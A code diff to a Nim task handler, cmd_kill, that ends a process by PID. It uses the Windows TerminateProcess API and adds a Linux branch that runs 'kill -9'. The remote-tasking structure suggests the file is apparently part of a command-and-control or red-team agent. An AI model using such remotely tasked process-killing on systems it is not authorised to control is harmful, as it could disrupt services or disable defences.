@@ -1,43 +1,48 @@
-# This is the source for the CAT command
 import ../structs
 import ../utils
-import ../rth/utils/winapi_wrapper
 import json
-import winim/lean
 
-#[
-Short Command Description
-  {"path": "anwiththestruct"}
+when defined(windows):
+  import ../rth/utils/winapi_wrapper
+  import winim/lean
+else:
+  from osproc import execCmdEx
 
-]#
 proc cmd_kill*(task: Task): seq[TaskResponse] {.cdecl.} =
-
   let params = parseJson(task.parameters)
   let pid = params["pid"].getInt()
 
-  # Configure Output
-  var
-    output = ""
-    status= ""
+  when defined(windows):
+    var
+      output = ""
+      status= ""
 
-  # Do the Magic
-  var hProc: HANDLE
-  var exitCode: DWORD
+    var hProc: HANDLE
+    var exitCode: DWORD
 
-  hProc = wOpenProcess(PROCESS_TERMINATE.or(PROCESS_QUERY_LIMITED_INFORMATION), 0, cast[DWORD](pid))
+    hProc = wOpenProcess(PROCESS_TERMINATE.or(PROCESS_QUERY_LIMITED_INFORMATION), 0, cast[DWORD](pid))
 
-  if hProc == 0:
-    return buildReturnData(task.id, output, "error")
+    if hProc == 0:
+      return buildReturnData(task.id, output, "error")
 
-
-  if GetExitCodeProcess(hProc, addr exitCode):
-    DBG("Terminating Process")
-    if TerminateProcess(hProc, cast[UINT](exitCode)) == FALSE:
+    if GetExitCodeProcess(hProc, addr exitCode):
+      DBG("Terminating Process")
+      if TerminateProcess(hProc, cast[UINT](exitCode)) == FALSE:
+        status = "error"
+    else:
       status = "error"
+
+    return buildReturnData(task.id, output, status)
   else:
-    status = "error"
+    var output = ""
+    var status = ""
 
+    try:
+      let (_, code) = execCmdEx("kill -9 " & $pid)
+      if code != 0:
+        status = "error"
 
-  # return the response
-  return buildReturnData(task.id, output, status)
-
+      return buildReturnData(task.id, output, status)
+    except:
+      status = "error"
+      return buildReturnData(task.id, output, status)
